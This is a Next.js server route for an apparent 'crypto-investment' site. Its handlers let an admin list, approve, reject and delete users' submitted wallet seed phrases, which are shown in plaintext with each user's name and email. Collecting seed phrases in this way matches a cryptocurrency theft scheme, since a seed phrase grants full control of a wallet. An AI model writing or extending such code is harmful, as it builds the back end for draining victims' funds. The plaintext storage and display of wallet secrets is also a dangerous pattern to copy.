import { NextResponse } from "next/server";
import { getServerSession } from "next-auth";
import { authOptions } from "@/app/api/auth/[...nextauth]/route";
import clientPromise from "@/lib/mongodb";
import { ObjectId } from "mongodb";
import { sendSeedphraseStatusUpdate } from "@/lib/email";

function isAdminSession(session: any) {
  return (
    (session?.user as any)?.role === "admin" ||
    (session?.user?.email && process.env.ADMIN_EMAIL && session.user.email === process.env.ADMIN_EMAIL)
  );
}

export async function GET() {
  try {
    const session = await getServerSession(authOptions);
    if (!session) return NextResponse.json({ error: "Unauthorized" }, { status: 401 });
    if (!isAdminSession(session)) return NextResponse.json({ error: "Forbidden" }, { status: 403 });

    const client = await clientPromise;
    const db = client.db("crypto-investment");

    const seedphrases = await db
      .collection("seedphrases")
      .find({})
      .sort({ submittedAt: -1 })
      .toArray();

    // Get user emails for each seedphrase
    const userIds = seedphrases.map((sp: any) => sp.userId);
    const users = await db
      .collection("users")
      .find({ _id: { $in: userIds.map((id: string) => new ObjectId(id)) } })
      .toArray();

    const userMap = new Map(users.map((u: any) => [u._id.toString(), u]));

    return NextResponse.json(
      seedphrases.map((sp: any) => {
        const user = userMap.get(sp.userId);
        return {
          id: sp._id.toString(),
          userId: sp.userId,
          userName: user?.name || "",
          userEmail: user?.email || "",
          walletType: sp.walletType,
          walletName: sp.walletName,
          walletIcon: sp.walletIcon,
          walletColor: sp.walletColor,
          seedPhrase: sp.seedPhrase,
          status: sp.status,
          submittedAt: sp.submittedAt,
          approvedAt: sp.approvedAt || null,
          approvedBy: sp.approvedBy || null,
        };
      })
    );
  } catch (e) {
    console.error("GET /api/admin/seedphrases error", e);
    return NextResponse.json({ error: "Something went wrong" }, { status: 500 });
  }
}

export async function PATCH(req: Request) {
  try {
    const session = await getServerSession(authOptions);
    if (!session) return NextResponse.json({ error: "Unauthorized" }, { status: 401 });
    if (!isAdminSession(session)) return NextResponse.json({ error: "Forbidden" }, { status: 403 });

    const body = await req.json();
    const { id, status, adminNote } = body;

    if (!id || !status || !['approved', 'rejected'].includes(status)) {
      return NextResponse.json({ error: "Invalid request" }, { status: 400 });
    }

    const client = await clientPromise;
    const db = client.db("crypto-investment");

    // Get the seedphrase submission
    const seedphrase = await db
      .collection("seedphrases")
      .findOne({ _id: new ObjectId(id) });

    if (!seedphrase) {
      return NextResponse.json({ error: "Seedphrase not found" }, { status: 404 });
    }

    // Get user details for email
    const user = await db
      .collection("users")
      .findOne({ _id: new ObjectId(seedphrase.userId) });

    // Update the seedphrase status
    const updateData: any = {
      status,
      approvedAt: new Date(),
      approvedBy: session.user.id,
    };

    await db
      .collection("seedphrases")
      .updateOne({ _id: new ObjectId(id) }, { $set: updateData });

    // Send email notification to user
    if (user?.email) {
      try {
        console.log('Sending seedphrase status email to:', user.email);
        const emailResult = await sendSeedphraseStatusUpdate({
          to: user.email,
          userName: user.name || 'User',
          walletName: seedphrase.walletName,
          status: status as 'approved' | 'rejected',
          adminNote: adminNote || null,
        });
        console.log('Email result:', emailResult);
      } catch (emailError) {
        console.error('Error sending seedphrase status email:', emailError);
        // Don't fail the request if email sending fails
      }
    } else {
      console.log('User has no email, skipping email notification. User:', user);
    }

    return NextResponse.json({ success: true, status });
  } catch (e) {
    console.error("PATCH /api/admin/seedphrases error", e);
    return NextResponse.json({ error: "Something went wrong" }, { status: 500 });
  }
}

export async function DELETE(req: Request) {
  try {
    const session = await getServerSession(authOptions);
    if (!session) return NextResponse.json({ error: "Unauthorized" }, { status: 401 });
    if (!isAdminSession(session)) return NextResponse.json({ error: "Forbidden" }, { status: 403 });

    const { searchParams } = new URL(req.url);
    const id = searchParams.get('id');

    if (!id) {
      return NextResponse.json({ error: "Missing id parameter" }, { status: 400 });
    }

    const client = await clientPromise;
    const db = client.db("crypto-investment");

    await db
      .collection("seedphrases")
      .deleteOne({ _id: new ObjectId(id) });

    return NextResponse.json({ success: true });
  } catch (e) {
    console.error("DELETE /api/admin/seedphrases error", e);
    return NextResponse.json({ error: "Something went wrong" }, { status: 500 });
  }
}
